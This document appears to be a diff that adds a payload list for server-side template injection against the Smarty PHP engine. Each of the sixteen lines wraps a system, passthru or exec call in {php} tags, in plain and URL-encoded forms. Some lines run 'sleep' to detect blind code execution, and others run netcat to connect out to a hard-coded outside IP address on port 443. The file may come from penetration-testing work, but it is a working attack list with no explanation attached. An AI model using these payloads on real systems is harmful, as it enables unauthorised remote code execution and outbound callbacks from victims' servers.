@@ -1,0 +1,16 @@
+{php}system('sleep 100'){/php}
+{php}system("sleep 100"){/php}
+{php}system('sleep+100'){/php}
+{php}system("sleep+100"){/php}
+{php}passthru(%27sleep 100%27){/php}
+{php}passthru(%22sleep 100%22){/php}
+{php}exec(%27sleep+10%27){/php}
+{php}exec(%22sleep+10%22){/php}
+{php}system('nc -nv 51.15.142.164 443'){/php}
+{php}system("nc -nv 51.15.142.164 443"){/php}
+{php}system('nc+-nv+51.15.142.164+443'){/php}
+{php}system("nc+-nv+51.15.142.164+443"){/php}
+{php}passthru(%27nc -nv 51.15.142.164 443%27){/php}
+{php}passthru(%22nc -nv 51.15.142.164 443%22){/php}
+{php}exec(%27nc+-nv+51.15.142.164+443%27){/php}
+{php}exec(%22nc+-nv+51.15.142.164+443%22){/php}
